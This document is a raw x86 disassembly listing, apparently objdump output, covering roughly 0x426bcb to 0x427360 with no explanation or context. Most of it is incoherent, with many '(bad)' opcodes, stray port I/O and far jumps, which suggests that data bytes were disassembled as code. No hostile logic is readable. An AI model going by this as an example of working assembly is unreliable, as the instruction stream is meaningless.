  426bcb:	mov    DWORD PTR [ebx-0x25],edi
  426bce:	xchg   ebx,eax
  426bcf:	mov    edx,0xf140522d
  426bd4:	shl    BYTE PTR [ecx+eiz*1-0x42db3840],1
  426bdb:	dec    edx
  426bdc:	not    BYTE PTR [ecx-0x25830f62]
  426be2:	add    DWORD PTR [ecx+0x4a0064cd],0x9867f123
  426bec:	cmovbe ebx,ebp
  426bef:	jge    0x426c41
  426bf1:	dec    esi
  426bf2:	push   edx
  426bf3:	pop    ds
  426bf4:	and    ebp,ebp
  426bf6:	sti    
  426bf7:	and    al,0xf5
  426bf9:	test   DWORD PTR [eax],ecx
  426bfb:	jae    0x426c3d
  426bfd:	xor    ecx,DWORD PTR [esi-0x2c2562ae]
  426c03:	add    ecx,DWORD PTR [ecx+0x10]
  426c06:	pop    esp
  426c07:	cmp    cl,BYTE PTR ds:0xbf841461
  426c0d:	cld    
  426c0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c0f:	mov    BYTE PTR [eax],al
  426c11:	add    al,dh
  426c13:	scas   eax,DWORD PTR es:[edi]
  426c14:	xchg   ecx,eax
  426c15:	shr    al,1
  426c17:	dec    esp
  426c18:	out    dx,al
  426c19:	inc    ecx
  426c1a:	fisubr DWORD PTR [ecx-0x72e94f4]
  426c20:	or     BYTE PTR [ebp+esi*4-0x32],dh
  426c24:	mov    ah,0x3b
  426c26:	clc    
  426c27:	lock and esp,edx
  426c2a:	fsub   DWORD PTR [edi+ebp*2-0x46127bcf]
  426c31:	cmp    eax,0xeca4d9be
  426c36:	jno    0x426c1b
  426c38:	inc    edx
  426c39:	pushf  
  426c3a:	lock pushf 
  426c3c:	sbb    al,0xb4
  426c3e:	retf   
  426c3f:	in     al,0x2f
  426c41:	xchg   ecx,eax
  426c42:	sti    
  426c43:	jno    0x426bd3
  426c45:	adc    cl,dh
  426c47:	mov    edx,DWORD PTR [ecx+eiz*2-0x7e]
  426c4b:	inc    ecx
  426c4c:	aas    
  426c4d:	pop    ds
  426c4e:	std    
  426c4f:	xlat   BYTE PTR ds:[ebx]
  426c50:	jge    0x426cb9
  426c52:	or     ch,ch
  426c54:	inc    ebx
  426c55:	adc    ecx,ebp
  426c57:	aam    0x47
  426c59:	mov    esp,0x214b86d5
  426c5e:	xor    al,0xdd
  426c60:	imul   DWORD PTR [edx+0x5a2217d1]
  426c66:	adc    al,0x9a
  426c68:	fprem1 
  426c6a:	adc    ebx,DWORD PTR [edx+edx*2]
  426c6d:	push   ebp
  426c6e:	mov    eax,ds:0xf5f46853
  426c73:	cmp    dl,BYTE PTR [edi]
  426c75:	push   edx
  426c76:	lods   al,BYTE PTR ds:[esi]
  426c77:	sub    edx,DWORD PTR [esi+0x186a80be]
  426c7d:	leave  
  426c7e:	shl    DWORD PTR [ebx+0x44],cl
  426c81:	jb     0x426c85
  426c83:	data16 xlat BYTE PTR ds:[ebx]
  426c85:	pusha  
  426c86:	mov    ds:0xa416f488,eax
  426c8b:	fimul  WORD PTR [ecx]
  426c8d:	bound  ebp,QWORD PTR [ebx]
  426c8f:	cmp    BYTE PTR [edi+0x70510e2],0x88
  426c96:	push   edx
  426c97:	aam    0x76
  426c99:	or     al,0xe2
  426c9b:	imul   ebx,esi,0x4d
  426c9e:	int    0x3a
  426ca0:	mov    ecx,0x8832adf0
  426ca5:	mov    dl,0xa4
  426ca7:	mov    bl,0xcf
  426ca9:	pop    ds
  426caa:	daa    
  426cab:	or     ecx,DWORD PTR [eax]
  426cad:	adc    BYTE PTR [esi-0x7c],0x46
  426cb1:	int3   
  426cb2:	int    0x22
  426cb4:	cdq    
  426cb5:	call   0xd96e6d16
  426cba:	push   esp
  426cbb:	inc    ebp
  426cbc:	imul   dh
  426cbe:	xchg   ebx,eax
  426cbf:	xchg   ebx,eax
  426cc0:	pop    ebp
  426cc1:	cmp    DWORD PTR [ecx],eax
  426cc3:	daa    
  426cc4:	imul   edi,DWORD PTR [ecx+0x58cc6cc8],0xb
  426ccb:	inc    eax
  426ccc:	jo     0x426d03
  426cce:	cmp    bh,dl
  426cd0:	mov    fs,WORD PTR [ecx-0x716c7ed0]
  426cd6:	and    DWORD PTR [esi],edi
  426cd8:	idiv   edx
  426cda:	aaa    
  426cdb:	mov    dl,0x64
  426cdd:	sbb    DWORD PTR [ebx+0x2a],edx
  426ce0:	repnz (bad) 
  426ce2:	test   DWORD PTR gs:[bp+di],eax
  426ce6:	pop    ds
  426ce7:	and    al,0xa5
  426ce9:	call   DWORD PTR [esi]
  426ceb:	ds sbb bl,cl
  426cee:	jg     0x426cb5
  426cf0:	imul   edi,ecx,0x1001be10
  426cf6:	xchg   DWORD PTR [edi+0x235ad0f4],esi
  426cfc:	(bad)  
  426cfd:	fwait
  426cfe:	in     al,dx
  426cff:	mov    DWORD PTR [edi],esi
  426d01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d02:	iret   
  426d03:	push   ss
  426d04:	mov    ebp,eax
  426d06:	addr16 cmp eax,ecx
  426d09:	mov    ecx,0x6adb293b
  426d0e:	hlt    
  426d0f:	outs   dx,BYTE PTR ds:[esi]
  426d10:	aad    0x48
  426d12:	rcr    ebx,cl
  426d14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d15:	mov    esi,0xf6c11ce0
  426d1a:	loop   0x426cfd
  426d1c:	jmp    0x100344b2
  426d21:	aaa    
  426d22:	or     edx,esi
  426d24:	outs   dx,BYTE PTR ds:[esi]
  426d25:	and    DWORD PTR [ebx+0x1a],esi
  426d28:	or     DWORD PTR [esi-0x2e],esp
  426d2b:	js     0x426cd6
  426d2d:	outs   dx,DWORD PTR ds:[esi]
  426d2e:	sub    BYTE PTR [edx+0x5eb18659],cl
  426d34:	in     al,dx
  426d35:	push   esp
  426d36:	sub    bl,bl
  426d38:	hlt    
  426d39:	cmc    
  426d3a:	ja     0x426d80
  426d3c:	mov    ebx,0x58a80b43
  426d41:	or     dl,dh
  426d43:	arpl   WORD PTR [ecx-0x8c9185c],bx
  426d49:	mov    eax,0x52b11afe
  426d4e:	sbb    al,0xca
  426d50:	mov    gs,WORD PTR [esi+0x22]
  426d53:	jge    0x426d72
  426d55:	je     0x426d00
  426d57:	push   es
  426d58:	and    BYTE PTR [esi+0x7c0ed46d],dl
  426d5e:	dec    esi
  426d5f:	inc    ecx
  426d60:	gs pop ecx
  426d62:	xchg   ecx,eax
  426d63:	mov    al,ds:0xae6a0c65
  426d68:	gs ins DWORD PTR es:[edi],dx
  426d6a:	sahf   
  426d6b:	es inc ecx
  426d6d:	mov    edx,0x4b10a9e
  426d72:	test   bh,dl
  426d74:	es addr16 pop edi
  426d77:	inc    ecx
  426d78:	arpl   WORD PTR [ecx+edi*1-0x3c76936],sp
  426d7f:	mov    edi,0x263a53bc
  426d84:	jecxz  0x426d26
  426d86:	push   esp
  426d87:	fwait
  426d88:	xchg   esp,eax
  426d89:	jno    0x426d7a
  426d8b:	fimul  WORD PTR [ebx]
  426d8d:	xor    bl,BYTE PTR [ecx-0x1f]
  426d90:	popf   
  426d91:	push   eax
  426d92:	mov    ah,0x50
  426d94:	fwait
  426d95:	inc    edi
  426d96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d97:	rol    DWORD PTR fs:[edi-0x60c33384],1
  426d9e:	lock out 0x38,al
  426da1:	stos   BYTE PTR es:[edi],al
  426da2:	not    BYTE PTR [edx-0x63]
  426da5:	leave  
  426da6:	adc    al,0x1
  426da8:	cmp    al,0x8f
  426daa:	repz cdq 
  426dac:	inc    ecx
  426dad:	inc    edx
  426dae:	int3   
  426daf:	int3   
  426db0:	mov    eax,DWORD PTR [eax+0x27565dc1]
  426db6:	jne    0x426e1f
  426db8:	cmp    BYTE PTR [ecx+0x62db9c2e],dh
  426dbe:	jns    0x426dd3
  426dc0:	aam    0x5c
  426dc2:	aaa    
  426dc3:	or     BYTE PTR [edi+edi*8-0x33d9c425],ah
  426dca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426dcb:	add    ah,BYTE PTR fs:[esi+0x5fda917e]
  426dd2:	inc    ecx
  426dd3:	(bad)  
  426dd5:	mov    ds,esp
  426dd7:	ds jbe 0x426d64
  426dda:	shl    ecx,1
  426ddc:	pop    es
  426ddd:	in     eax,dx
  426dde:	es (bad) 
  426de0:	rol    BYTE PTR ds:0xd877b688,cl
  426de6:	imul   esp,DWORD PTR [edi+0x41],0x5c
  426dea:	jne    0x426dab
  426dec:	mov    cl,BYTE PTR [ebp+0x1f39975a]
  426df2:	push   esi
  426df3:	mov    ?,WORD PTR [edi+0x4433b640]
  426df9:	shl    BYTE PTR [edx],cl
  426dfb:	mov    eax,0x3ecf5f5a
  426e00:	or     DWORD PTR [esi],edi
  426e02:	xchg   ecx,eax
  426e03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e04:	jecxz  0x426e72
  426e06:	jmp    0xfc945b6a
  426e0b:	(bad)  
  426e0c:	aam    0xec
  426e0e:	icebp  
  426e0f:	pop    ebx
  426e10:	pop    esi
  426e11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e12:	shl    bh,0xa6
  426e15:	mov    ebp,0xd6f7c5e2
  426e1a:	mov    ebx,0x99918c93
  426e1f:	xor    BYTE PTR ds:0x47675995,dl
  426e25:	ret    0xbc36
  426e28:	mov    edi,ebp
  426e2a:	dec    ebx
  426e2b:	mov    dh,0x59
  426e2d:	test   bl,0x78
  426e30:	data16 hlt 
  426e32:	pop    ecx
  426e33:	aaa    
  426e34:	dec    ebx
  426e35:	sub    al,0x2
  426e37:	dec    ebp
  426e38:	test   al,0xdf
  426e3a:	ins    BYTE PTR es:[edi],dx
  426e3b:	iret   
  426e3c:	aam    0x2e
  426e3e:	push   ebx
  426e3f:	fnstenv [esi-0x2b9b4fd7]
  426e45:	and    al,BYTE PTR [edi+0x6]
  426e48:	or     edx,DWORD PTR [eax-0x20]
  426e4b:	mov    ch,0x38
  426e4d:	or     al,0xca
  426e4f:	xchg   esi,eax
  426e50:	sbb    bl,BYTE PTR [edi-0x49fbf06e]
  426e56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e57:	ficom  WORD PTR [edx+ecx*4]
  426e5a:	push   edi
  426e5b:	fisubr DWORD PTR [eax-0x75]
  426e5e:	xchg   ebx,eax
  426e5f:	xor    al,0xa2
  426e61:	sbb    bh,BYTE PTR [ebx+0x6a]
  426e64:	data16 or BYTE PTR [esi+0x18],ah
  426e68:	inc    ebx
  426e69:	(bad)  
  426e6a:	mov    ebx,0xa75b4e07
  426e6f:	aam    0x37
  426e71:	dec    esp
  426e72:	call   0xb9df:0xa7e8ad4a
  426e79:	sub    BYTE PTR [ecx-0x43304dcc],ah
  426e7f:	dec    ebp
  426e80:	js     0x426ee8
  426e82:	fild   DWORD PTR [esp+edi*1]
  426e85:	push   cs
  426e86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e87:	ins    BYTE PTR es:[edi],dx
  426e88:	mov    bl,0xa7
  426e8a:	(bad)  
  426e8b:	nop
  426e8c:	shr    DWORD PTR [ecx],cl
  426e8e:	test   DWORD PTR [ebx+ebp*4],0xdc4b266f
  426e95:	loop   0x426e6f
  426e97:	call   0x86df:0x6bbee5d5
  426e9e:	dec    esi
  426e9f:	cmp    eax,0xf2aa6e7b
  426ea4:	aad    0x3c
  426ea6:	dec    esi
  426ea7:	ja     0x426eb6
  426ea9:	(bad)  ss:[eax+edi*2+0x4a]
  426eae:	lods   al,BYTE PTR ds:[esi]
  426eaf:	test   al,0xf
  426eb1:	popf   
  426eb2:	mov    dl,0x92
  426eb4:	xlat   BYTE PTR ds:[ebx]
  426eb5:	(bad)  
  426eb6:	bound  eax,QWORD PTR [ecx-0x3c]
  426eb9:	pop    ebp
  426eba:	pop    ds
  426ebb:	cmp    eax,0x48b59fce
  426ec0:	int    0xa2
  426ec2:	stos   BYTE PTR es:[edi],al
  426ec3:	dec    edx
  426ec4:	mov    ecx,0x9a1e5d7a
  426ec9:	mov    dl,0x61
  426ecb:	cmp    al,0x7d
  426ecd:	inc    edx
  426ece:	pop    ss
  426ecf:	adc    al,0x93
  426ed2:	ret    
  426ed3:	push   ds
  426ed4:	nop
  426ed5:	lods   eax,DWORD PTR ds:[esi]
  426ed6:	out    dx,eax
  426ed7:	and    al,0xfd
  426ed9:	adc    al,0x9c
  426edb:	out    dx,al
  426edc:	idiv   DWORD PTR [esp+edx*1+0x504f5c12]
  426ee3:	imul   ebx,DWORD PTR [eax+0x40165781],0x54
  426eea:	sahf   
  426eeb:	sbb    bh,BYTE PTR [esi-0x179cd141]
  426ef1:	loope  0x426e88
  426ef3:	loopne 0x426eae
  426ef5:	sbb    eax,0xdd52da04
  426efa:	(bad)  
  426efb:	call   0x647944c0
  426f00:	out    0xb3,al
  426f02:	adc    BYTE PTR [ebp+0x63],0x9f
  426f06:	mov    ds:0xcec6a890,al
  426f0b:	pop    eax
  426f0c:	or     ch,BYTE PTR [edx+0xf8c2b63]
  426f12:	jns    0x426f8d
  426f14:	sti    
  426f15:	sub    eax,0x4d261a3e
  426f1a:	cli    
  426f1b:	fmul   QWORD PTR [eax+ecx*2]
  426f1e:	inc    ebx
  426f1f:	ficom  DWORD PTR [edi]
  426f21:	hlt    
  426f22:	inc    edi
  426f23:	pop    ss
  426f24:	fmul   QWORD PTR [edx-0x16]
  426f27:	inc    ecx
  426f28:	aad    0x33
  426f2a:	retf   
  426f2b:	sub    esp,DWORD PTR [edi]
  426f2d:	cmp    eax,0x86a6659
  426f32:	aad    0x25
  426f34:	pop    ebp
  426f35:	xor    BYTE PTR [edx],dl
  426f37:	push   0xffffffe2
  426f39:	mov    ds:0x31ac29d9,eax
  426f3e:	jecxz  0x426f12
  426f40:	adc    ebp,DWORD PTR [esi+esi*8+0x5f720650]
  426f47:	pop    ss
  426f48:	mov    edx,0xf14406e0
  426f4d:	inc    esi
  426f4e:	cmp    al,0xd6
  426f50:	sar    BYTE PTR [esi+0x24],1
  426f53:	clc    
  426f54:	loope  0x426f6d
  426f56:	mov    ds,WORD PTR [esp+edx*8]
  426f59:	add    al,dh
  426f5b:	shr    DWORD PTR [esi+0x77],1
  426f5e:	into   
  426f5f:	jmp    DWORD PTR [ecx+0x41]
  426f62:	xchg   BYTE PTR [ebx],ah
  426f64:	test   eax,0x8d37c044
  426f69:	mov    dl,0x2a
  426f6b:	mov    esi,0x471cb47
  426f70:	push   esi
  426f71:	lds    edi,FWORD PTR [ebx+ebx*2-0x1d0b2e98]
  426f78:	add    eax,0x98453472
  426f7d:	cmp    ah,dh
  426f7f:	fld    TBYTE PTR [ecx-0x62]
  426f82:	sub    BYTE PTR [ebp-0x146ed257],ch
  426f88:	or     ch,BYTE PTR [eax]
  426f8a:	xor    esp,DWORD PTR [ecx-0x77]
  426f8d:	cmp    DWORD PTR [ebp-0x85eba71],ebx
  426f93:	shl    BYTE PTR [edi+ebp*8-0x9c381c0],0x63
  426f9b:	stos   DWORD PTR es:[edi],eax
  426f9c:	fadd   st,st(7)
  426f9e:	cdq    
  426f9f:	ficomp WORD PTR [edi+0x23]
  426fa2:	cmp    al,0x36
  426fa4:	push   ebp
  426fa5:	sbb    BYTE PTR [edi],bl
  426fa7:	or     edx,edx
  426fa9:	lock mov ch,0xa0
  426fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fad:	pop    edx
  426fae:	scas   al,BYTE PTR es:[edi]
  426faf:	mov    edi,DWORD PTR [edx]
  426fb1:	(bad)  
  426fb2:	push   eax
  426fb3:	(bad)  
  426fb5:	rcr    BYTE PTR [edi-0x5],0x37
  426fb9:	push   ecx
  426fba:	inc    ebx
  426fbb:	add    eax,0xf9d714d5
  426fc0:	xchg   DWORD PTR [esi+0x22],ebx
  426fc3:	xchg   ecx,eax
  426fc4:	aaa    
  426fc5:	or     eax,DWORD PTR [eax]
  426fc7:	call   0x80d9:0x1f46097c
  426fce:	xor    edx,DWORD PTR [ebx-0x3a]
  426fd1:	pop    es
  426fd2:	or     ebp,DWORD PTR [edi]
  426fd4:	fwait
  426fd5:	cs pop eax
  426fd7:	in     al,0x40
  426fd9:	jmp    0xc393167b
  426fde:	in     eax,0x2e
  426fe0:	and    al,0x9f
  426fe2:	fcmovb st,st(6)
  426fe4:	push   ecx
  426fe5:	dec    ebp
  426fe6:	icebp  
  426fe7:	xchg   esi,eax
  426fe8:	push   cs
  426fe9:	jnp    0x42702d
  426feb:	mov    edx,0xc00770b3
  426ff0:	pop    edx
  426ff1:	jmp    0xc552:0xd81bd98d
  426ff8:	lock cmc 
  426ffa:	out    dx,eax
  426ffb:	clc    
  426ffc:	inc    edx
  426ffd:	inc    edi
  426ffe:	add    esp,0x5991853d
  427004:	aad    0x6e
  427006:	clc    
  427007:	jae    0x426ffc
  427009:	(bad)  
  42700b:	jmp    0x1d42:0x2cd1ad2a
  427012:	fild   QWORD PTR [edx]
  427014:	ja     0x427034
  427016:	jmp    0x3573:0x3c057a37
  42701d:	or     al,0x14
  42701f:	dec    esi
  427020:	inc    ebp
  427021:	xchg   ebx,eax
  427022:	shl    dh,0x18
  427025:	jo     0x427065
  427027:	fmul   DWORD PTR [eax+0x36]
  42702a:	push   0xffffff94
  42702c:	mov    edx,0x6abaf1f8
  427031:	(bad)  
  427032:	addr16 imul edi,eax,0xffffffb6
  427036:	push   es
  427037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427039:	repz sub al,0x95
  42703c:	jle    0x427044
  42703e:	mov    al,ds:0x7eb65529
  427043:	sub    edi,DWORD PTR [ebx-0xacec5cb]
  427049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42704a:	push   eax
  42704b:	mov    DWORD PTR [ebp+0x39af329],esp
  427051:	xchg   ebp,eax
  427052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427053:	imul   ebx,eax,0x7d31c413
  427059:	inc    cl
  42705b:	(bad)  
  42705c:	les    esp,FWORD PTR [eax-0x5f]
  42705f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427060:	in     al,dx
  427061:	sti    
  427062:	cmp    ebp,edi
  427064:	pop    esi
  427065:	jecxz  0x427044
  427067:	inc    edi
  427068:	(bad)  
  427069:	ror    DWORD PTR [edi],cl
  42706b:	xchg   ecx,eax
  42706c:	shl    DWORD PTR [esi+0x5e924497],0x7e
  427073:	cmp    ch,BYTE PTR [edi+edx*4]
  427076:	imul   BYTE PTR [eax]
  427078:	dec    esi
  427079:	retf   0x397a
  42707c:	xor    DWORD PTR [eax+eiz*1-0x5157c012],ecx
  427083:	shl    DWORD PTR [eax+0x2951986e],0x24
  42708a:	fs xchg ebp,eax
  42708c:	in     al,dx
  42708d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42708e:	add    dh,BYTE PTR [ecx+0x5a]
  427091:	cmp    DWORD PTR [ecx],ebp
  427093:	mov    dl,0x33
  427095:	ret    
  427096:	xor    ecx,DWORD PTR [ecx]
  427098:	jle    0x42705f
  42709a:	xchg   ebx,eax
  42709b:	add    cl,BYTE PTR [edx+0x77]
  42709e:	xor    esi,esi
  4270a0:	push   ebp
  4270a1:	push   eax
  4270a2:	pop    edi
  4270a3:	and    bl,BYTE PTR [ecx-0x67]
  4270a6:	or     eax,0x18f4ef2a
  4270ab:	and    DWORD PTR [esi+0x4b5904a6],ebp
  4270b1:	fst    DWORD PTR [ecx-0x54]
  4270b4:	ret    
  4270b5:	das    
  4270b6:	or     DWORD PTR [ebx+0xc],0x18ca8c8d
  4270bd:	adc    BYTE PTR [esi],ah
  4270bf:	jmp    0x427045
  4270c1:	sub    eax,0xdb99b34d
  4270c6:	mov    dl,0x6a
  4270c8:	aad    0xd4
  4270ca:	loop   0x427089
  4270cc:	xchg   ah,ah
  4270ce:	shl    DWORD PTR [edi+edi*2-0x38],0x1e
  4270d3:	pcmpgtw mm3,QWORD PTR cs:[esi-0x77]
  4270d8:	jp     0x42712c
  4270da:	int3   
  4270db:	jmp    0x427074
  4270dd:	or     al,0xa8
  4270df:	mov    cl,0xd4
  4270e1:	inc    esi
  4270e2:	aas    
  4270e3:	xchg   ecx,eax
  4270e4:	out    0xc7,eax
  4270e6:	adc    al,0x2b
  4270e8:	outs   dx,DWORD PTR ds:[esi]
  4270e9:	rcl    bl,1
  4270eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4270ec:	aas    
  4270ed:	stos   DWORD PTR es:[edi],eax
  4270ee:	jecxz  0x4270f2
  4270f0:	sbb    ebx,DWORD PTR [edx+0x7b]
  4270f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4270f4:	mov    eax,ds:0xd6fd0d5e
  4270f9:	lods   al,BYTE PTR ds:[esi]
  4270fa:	and    BYTE PTR [eax-0x64bdbbef],dh
  427100:	inc    eax
  427101:	(bad)  
  427102:	fprem  
  427104:	push   esp
  427105:	push   eax
  427106:	jbe    0x4270c2
  427108:	mov    bh,0x78
  42710a:	xor    ecx,ecx
  42710c:	pop    eax
  42710d:	cli    
  42710e:	outs   dx,DWORD PTR ds:[esi]
  42710f:	dec    esp
  427110:	jb     0x4270d1
  427112:	fiadd  DWORD PTR [eax+0x7c]
  427115:	and    al,0x69
  427117:	sahf   
  427118:	mov    eax,0x307d738b
  42711d:	inc    ecx
  42711e:	loopne 0x4270a5
  427120:	dec    esi
  427121:	adc    dl,BYTE PTR [edx+0x4cb71488]
  427127:	pusha  
  427128:	jg     0x4270b8
  42712a:	mov    ch,0xf7
  42712c:	addr16 repz inc ebx
  42712f:	add    eax,0x6dfc3f63
  427134:	div    BYTE PTR [edx-0x26]
  427137:	div    BYTE PTR [edx]
  427139:	jnp    0x427176
  42713b:	mov    al,0x9
  42713d:	dec    ecx
  42713e:	lea    ecx,[ebp+0x6872c6fe]
  427144:	outs   dx,DWORD PTR ds:[esi]
  427145:	pop    edi
  427146:	cwde   
  427147:	fs xchg ecx,eax
  427149:	sahf   
  42714a:	mov    esi,0x4fb6a385
  42714f:	push   es
  427150:	mov    dh,0xa
  427152:	and    ecx,DWORD PTR [edi]
  427154:	data16 jecxz 0x42715f
  427157:	xchg   ebp,eax
  427158:	and    al,0xdb
  42715a:	imul   eax,DWORD PTR [ecx],0xeb284094
  427160:	fldenv [ebx-0x55847c2d]
  427166:	xchg   ecx,eax
  427167:	(bad)  [edx+ebx*1]
  42716a:	data16 fisub WORD PTR [esp+eax*2+0x341016a]
  427172:	xchg   esi,eax
  427173:	sbb    al,0xce
  427175:	dec    esi
  427176:	lahf   
  427177:	jecxz  0x4271e7
  427179:	sub    BYTE PTR [ebx+edi*8],dh
  42717c:	jl     0x427190
  42717e:	inc    ecx
  42717f:	repz mov edi,0x3016aa0b
  427185:	sub    BYTE PTR es:[ecx],bh
  427188:	push   ebx
  427189:	mov    ah,0xee
  42718b:	push   cs
  42718c:	mov    cl,0x4f
  42718e:	cs pop ebx
  427190:	sbb    cl,BYTE PTR [edi]
  427192:	lea    esi,[edi+0x2e89cbda]
  427198:	lods   eax,DWORD PTR ds:[esi]
  427199:	fmul   QWORD PTR [edx+0x2cc5c303]
  42719f:	int3   
  4271a0:	retf   0xf856
  4271a3:	(bad)  
  4271a4:	mov    ds:0x6febd17,eax
  4271a9:	dec    ebx
  4271aa:	sub    eax,0x60d4811d
  4271af:	in     eax,0xab
  4271b1:	dec    eax
  4271b2:	retf   0x8929
  4271b5:	cmp    eax,0x4f83dfa1
  4271ba:	adc    DWORD PTR [esi+0x3a],ebx
  4271bd:	in     eax,dx
  4271be:	in     eax,dx
  4271bf:	sahf   
  4271c0:	into   
  4271c1:	mov    BYTE PTR [esi],al
  4271c3:	xor    bl,BYTE PTR [ecx]
  4271c5:	icebp  
  4271c6:	es jns 0x4271c7
  4271c9:	and    DWORD PTR [edx-0x1d],0xbdcb70ea
  4271d0:	lods   eax,DWORD PTR ds:[esi]
  4271d1:	cdq    
  4271d2:	push   eax
  4271d3:	jnp    0x4271f8
  4271d5:	add    edx,ebx
  4271d7:	push   0xd
  4271d9:	dec    esp
  4271da:	push   0x21
  4271dc:	test   eax,0x1175b455
  4271e1:	and    DWORD PTR [edx+0x7f],0xc
  4271e5:	mov    eax,0x70a2c920
  4271ea:	xor    DWORD PTR [bx+si+0x7708],ecx
  4271ef:	dec    ebp
  4271f0:	inc    esi
  4271f1:	push   ebp
  4271f2:	push   ebp
  4271f3:	test   al,0x30
  4271f5:	ss pop esp
  4271f7:	das    
  4271f8:	aaa    
  4271f9:	icebp  
  4271fa:	sbb    BYTE PTR [ebp-0x4c522336],al
  427200:	jno    0x427249
  427202:	xlat   BYTE PTR ds:[ebx]
  427203:	jmp    0xb09:0x479a15ef
  42720a:	(bad)  
  42720c:	xchg   ebx,eax
  42720d:	dec    eax
  42720e:	(bad)  
  42720f:	outs   dx,DWORD PTR ds:[esi]
  427210:	dec    edx
  427211:	push   ss
  427212:	ja     0x4271ca
  427214:	shl    ah,1
  427216:	jbe    0x4271ff
  427218:	sahf   
  427219:	cwde   
  42721a:	into   
  42721b:	je     0x427215
  42721d:	and    al,0x29
  42721f:	loop   0x427221
	...
  427229:	add    BYTE PTR [ebp+0x55],cl
  42722c:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  427232:	mov    esp,ebp
  427234:	or     al,ah
  427236:	dec    ebp
  427237:	add    bh,al
  427239:	add    BYTE PTR [eax],cl
  42723b:	add    BYTE PTR [eax],al
  42723d:	mov    DWORD PTR [eax],0x3ef44545
  427243:	cmp    BYTE PTR [eax],al
  427245:	test   DWORD PTR [ebx-0x34070b64],ecx
  42724b:	(bad)  
  42724c:	enter  0x4d45,0xb8
  427250:	mov    edi,DWORD PTR [ecx]
  427252:	hlt    
  427253:	test   ebx,ecx
  427255:	pushf  
  427256:	enter  0x4df8,0x8b
  42725a:	mov    DWORD PTR [ebp+0x8],0x894708
  427261:	inc    ebp
  427262:	mov    ebp,0xff8bfffc
  427267:	dec    ebp
  427268:	mov    ch,0xf4
  42726a:	call   DWORD PTR [ebx-0x1]
  42726d:	mov    ebx,0x8005022
  427272:	call   DWORD PTR [ecx+0x8]
  427275:	pop    es
  427276:	jmp    0xb8:0x9cb4533
  42727d:	cwde   
  42727e:	mov    esi,DWORD PTR [edx-0xc]
  427281:	xor    al,bl
  427283:	add    BYTE PTR [eax+0x3c83203],bl
  427289:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  42728f:	mov    eax,DWORD PTR [ebx-0xb87b3]
  427295:	xor    eax,DWORD PTR [eax]
  427297:	retf   
  427298:	ret    
  427299:	add    eax,esi
  42729b:	enter  0x8945,0x64
  42729f:	dec    ebp
  4272a0:	sbb    ah,cl
  4272a2:	add    BYTE PTR [ebx-0xb87b277],cl
  4272a8:	dec    DWORD PTR [ebx-0xbcfb275]
  4272ae:	test   DWORD PTR [ebx],esi
  4272b0:	dec    ebx
  4272b2:	inc    DWORD PTR [ebx]
  4272b4:	inc    eax
  4272b5:	enter  0x8989,0x64
  4272b9:	(bad)  
  4272ba:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4272be:	cld    
  4272bf:	dec    DWORD PTR [ebp-0xa90001]
  4272c5:	push   edi
  4272c6:	mov    BYTE PTR [edx+0x1],ch
  4272c9:	and    BYTE PTR [eax],al
  4272cb:	pop    ecx
  4272cc:	inc    ebp
  4272cd:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4272d3:	push   0xffffff89
  4272d5:	pop    ecx
  4272d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272d7:	dec    ebp
  4272d8:	add    BYTE PTR [ecx+0x45fc088b],cl
  4272de:	jne    0x427328
  4272e0:	lea    eax,[eax]
  4272e2:	fs (bad) 
  4272e4:	dec    DWORD PTR [eax]
  4272e6:	mov    DWORD PTR [eax],eax
  4272e8:	test   al,0x0
  4272ea:	add    BYTE PTR [ebp-0x18],cl
  4272ed:	xor    ebp,DWORD PTR [edx]
  4272ef:	add    eax,DWORD PTR [eax]
  4272f1:	mov    eax,eax
  4272f3:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4272fa:	inc    ebp
  4272fb:	mov    DWORD PTR [ebx+0x459408],ecx
  427301:	popa   
  427302:	mov    esp,DWORD PTR [ebp-0x75]
  427305:	(bad)  
  427306:	cld    
  427307:	inc    eax
  427308:	cmp    bh,0x1
  42730b:	lea    eax,[eax]
  42730d:	and    BYTE PTR [eax],al
  42730f:	inc    DWORD PTR [ecx-0x18]
  427312:	mov    ecx,DWORD PTR [ebx]
  427314:	cld    
  427315:	add    BYTE PTR [ecx+0x75014d],cl
  42731b:	(bad)  
  42731c:	xchg   ebp,eax
  42731d:	sar    bh,1
  42731f:	inc    eax
  427320:	inc    DWORD PTR [eax]
  427322:	mov    eax,DWORD PTR [ebp-0x4]
  427325:	xor    edx,DWORD PTR [edx+0x7201be]
  42732b:	add    BYTE PTR [edx],dl
  42732d:	(bad)  
  42732e:	nop
  42732f:	inc    ebp
  427330:	add    BYTE PTR [ebx-0x5afb0c00],cl
  427336:	mov    al,0xff
  427338:	add    bh,bh
  42733a:	add    BYTE PTR [ebx],dh
  42733c:	inc    DWORD PTR [ebx]
  42733e:	sbb    al,0x89
  427340:	jne    0x42731e
  427342:	mov    esp,DWORD PTR [ecx+0x4500fc]
  427348:	mov    eax,DWORD PTR [ebp-0xff0048]
  42734e:	mov    DWORD PTR [eax-0x70],0xee70ed89
  427355:	inc    DWORD PTR [ebp-0x75]
  427358:	fisttp QWORD PTR [eax+ebp*8]
  42735b:	test   DWORD PTR [esi-0x1],esp
  42735e:	inc    ebp
  42735f:	(bad)  
  427360:	aas    
